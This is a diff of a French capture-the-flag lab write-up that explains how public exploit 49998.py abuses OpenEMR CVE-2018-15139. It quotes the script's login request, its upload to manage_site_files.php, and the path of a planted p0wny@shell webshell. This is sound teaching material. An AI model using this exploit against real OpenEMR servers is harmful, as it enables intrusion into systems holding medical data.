@@ -1380,37 +1380,75 @@ cd 49998
 searchsploit -m php/webapps/49998.py
 ```
 
-Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’en comprendre le fonctionnement général et les différentes étapes de l’exploitation :
+Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’en comprendre le fonctionnement général :
 
 ```bash
 nano 49998.py
 ```
 
-L’en-tête indique que le script exploite la vulnérabilité `CVE-2018-15139`.
+L’en-tête indique que le script exploite la vulnérabilité :
 
-Après s’être authentifié auprès d’OpenEMR avec un compte valide, le script accède à la page suivante :
+```text
+CVE-2018-15139
+```
+
+La description précise qu’il s’agit d’un téléversement de fichier non restreint dans :
 
 ```text
 /interface/super/manage_site_files.php
 ```
 
-Cette page permet normalement de gérer certains fichiers du site OpenEMR. L’exploit détourne cette fonctionnalité pour y déposer une webshell PHP nommée :
+L’exploitation nécessite toutefois un utilisateur OpenEMR authentifié.
 
-```text
-shell.php
+Le script commence donc par construire la requête de connexion :
+
+```python
+auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&site=default'
+
+body = {
+    'new_login_session_management': '1',
+    'authProvider': 'Default',
+    'authUser': username,
+    'clearPass': password,
+    'languageChoice': '1'
+}
+
+auth = session.post(auth_url, headers=header, data=body)
 ```
 
-Le script intègre directement une webshell basée sur `p0wny@shell`.
+Tu retrouves ici les mêmes paramètres d’authentification que ceux observés précédemment avec Burp Suite : `authUser` pour le nom d’utilisateur et `clearPass` pour le mot de passe.
+
+Une fois authentifié, le script cible la page vulnérable :
+
+```python
+exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'
+```
+
+Il prépare ensuite une requête `multipart/form-data` contenant un fichier PHP nommé `shell.php`. Ce fichier embarque `p0wny@shell`, une interface web permettant d’exécuter des commandes sur le serveur.
+
+La requête est envoyée avec :
+
+```python
+session.post(exploit_url, headers=header, data=body)
+```
+
+Si l’envoi réussit, la webshell devient accessible ici :
+
+```python
+path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
+```
+
+L’exploitation consiste donc à téléverser `shell.php` via `manage_site_files.php`, puis à l’ouvrir dans le navigateur pour exécuter des commandes.
+
+Le fonctionnement général de l’exploit est donc assez simple :
+
+1. s’authentifier auprès d’OpenEMR ;
+2. envoyer `shell.php` via `manage_site_files.php` ;
+3. accéder ensuite à la webshell dans `/sites/default/images/`.
 
 `p0wny@shell` est une webshell PHP légère qui permet d’exécuter des commandes sur le serveur depuis une interface web, avec les privilèges du compte utilisé par le serveur web.
 
-Si l’envoi réussit, la webshell doit être déposée dans le répertoire des images du site OpenEMR et devenir accessible à l’adresse suivante :
-
-```url
-http://hms.htb/sites/default/images/shell.php
-```
-
-Avant de lancer l’exploitation, tu affiches l’aide de `49998.py` afin d’identifier les paramètres attendus :
+Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :
 
 ```bash
 python3 49998.py -h
